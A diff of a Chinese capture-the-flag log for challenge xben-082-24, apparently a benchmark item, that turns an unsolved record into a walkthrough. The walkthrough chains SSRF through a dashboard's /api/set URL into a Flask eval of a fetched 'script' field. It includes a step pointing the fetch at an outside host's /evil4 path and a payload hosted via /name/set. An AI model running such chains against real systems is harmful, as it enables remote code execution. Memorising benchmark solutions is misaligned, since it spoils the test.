@@ -1,50 +1,48 @@
-# xben-082-24 · 探索记录（未解）
+# xben-082-24 · 探索记录
 
-对应题解：暂无（本题未拿到 flag）
+对应题解：[`xben-082-24.md`](./xben-082-24.md)
 
-## 结论
+## 目标与起点
 
-API Dashboard + Flask microservice。`/api/set?url=` 能改 dashboard 抓取的地址（自建 HTTP 服务确实收到请求），`/name/set` 只存字符串不 eval；Flask 侧 `/script` 返回 `{"script": "'OK ' * 4"}`，但没有找到「抓取后执行」的落点。未拿到 flag。
+`10.0.172.217` 的 `:80`（dashboard）与 `:8081`（flask_api），另有 `:8080`（flask_app）。
+首页说明目标是「在 flask_app 容器执行命令并读 `/FLAG.txt`」。
 
-## 尝试过程
+## 第一阶段：摸清三个组件
 
-- `/api/get` → 当前 URL；`/api/set?url=...` → `API URL set to: ...`。
-- 用本机 `python3 -m http.server` 提供 `/script`，dashboard 确实发起 GET（服务端日志可见）。
-- 把 URL 指向 `http://127.0.0.1:8081/script` 时 `/api/get` 显示该地址，但页面没有把返回的 `script` 求值。
-- `/name/set?name=1+1` 后 `/name/get` 返回 `1+1`（不求值）。
-- 8081 的 `/console` 返回 400（Werkzeug debugger 未启用）。
+- `:8081/` → `Welcome to the sample Flask microservice!, check out /script and /healthcheck`
+- `:8081/script` → `{"script": "'OK ' * 4"}`
+- `:8080/healthcheck` → `OK`；`:8080/app` → 渲染 `OK OK OK OK`
+- `:80` 是 dashboard，`/api/get` 返回当前 API URL，`/name/get` 返回当前 hostname
 
-## 说明
+## 第二阶段：确认 eval 链条
 
-本文件只记录实际做过的请求与判据；没有验证过的猜想不写进结论。
-
-## 补充：2026-10-28 的 hosts 表与 flask_app 行为
-
-首页底部有一张 **Hosts** 表（此前的记录漏了它）：
-
-```text
-Nginx Root   http://nginx:80/        -> http://nginx:80/
-Flask App    http://flask_app:8080   -> http://nginx:80/app/
-Flask API    http://flask_api:8081   -> http://nginx:8081/
-```
-
-结合实测：
-
-| 请求 | 结果 |
+| 操作 | 结果 |
 | --- | --- |
-| `GET /api/get` | 返回当前配置的 URL 字符串（不发请求） |
-| `GET /api/set?url=...` | 保存 URL |
-| `GET /name/get`、`/name/<任意词>` | 都返回 `'Cocomelon'`（catch-all） |
-| `GET /name/set?name=1+1` | 保存后 `/name/get` 返回字面量 `1+1`，不求值 |
-| `GET /healthcheck` | `OK`（代理到 flask_api） |
-| `GET /app/`、`/app/script` | Flask 404（映射存在但路径不对） |
-| `GET /script`（:80） | nginx 404（:80 不代理 /script） |
+| 直接 `GET :8080/app` | `OK OK OK OK`（= `'OK ' * 4` 求值） |
+| `GET :80/api/set?url=http://10.254.1.70:8899/evil4` 后 `GET :8080/app` | 500 `Network is unreachable` |
 
-把 `/api/set` 指到我方 `python3 -m http.server`（返回 `{"script": "'HELLO'"}`），
-再依次调用 `/api/get`、`/name/get`，**我方日志没有任何请求**——说明 flask_app
-并不会主动去拉取该 URL，或者只在某个未发现的触发点才拉取。`/FLAG.txt` 的读取点
-（flask_app 容器）仍未找到。
+判据：flask_app 确实去拉了 URL（有连接尝试），只是容器内网到不了 VPN 网段。
 
-遗留线索：`flask_api:/script` 返回的 `{"script": "'OK ' * 4"}` 显然是被设计成给某个
-组件 `eval` 的；缺的是那个组件/路由。下一步应优先穷举 nginx 的 location（`/name/*`
-是前缀代理的证据），而不是继续猜 flask_app 的路由名。
+## 第三阶段：用 `/name/get` 托管 payload
+
+| 操作 | 结果 |
+| --- | --- |
+| `GET /name/set?name={"script":"6*7"}` → `/name/get` | 原样返回 `{"script":"6*7"}`（裸文本，无转义） |
+| `GET /api/set?url=http://nginx:80/name/get` | `API URL set to: ...` |
+| `GET :8080/app` | 200，`<div class="result">flag{...}</div>` |
+
+## 走不通 / 走过的弯路（留档）
+
+| 方向 | 结果 | 判据 |
+| --- | --- | --- |
+| 用本机 `python3 -m http.server` 托管 payload | 500 `Network is unreachable` | 容器内网无法回连 VPN 地址 |
+| `/app/`、`/app/script`（经 `:80` 的 `/app` 前缀） | 404 | nginx 的 `/app` location 转发的是 `/app`，flask_app 只挂了 `/app` 与 `/healthcheck`（直接访问 `:8080/app` 才 200） |
+| `/name/set` 里写 `\x27` 转义的单引号 | eval 失败（语法错误） | 存进去的是字面 `\x27`，需直接写 `'` |
+| 把 name 设成裸 Python 表达式（不带 JSON） | 不生效 | `/app` 期望 JSON，取 `.script` 字段 |
+
+## 这次真正的收获
+
+1. **「写入 + 原样回显」的接口 = 内网 payload 托管**，比向外网回连可靠得多。
+2. **SSRF 失败时先看错误类型。** `Network is unreachable` 是网络不可达（选错目标），
+   `Connection refused`/`getaddrinfo` 才可能是服务不存在。
+3. **读 Hosts 表**：容器里能用的主机名写在页面上，不要用宿主/VPN 的地址。
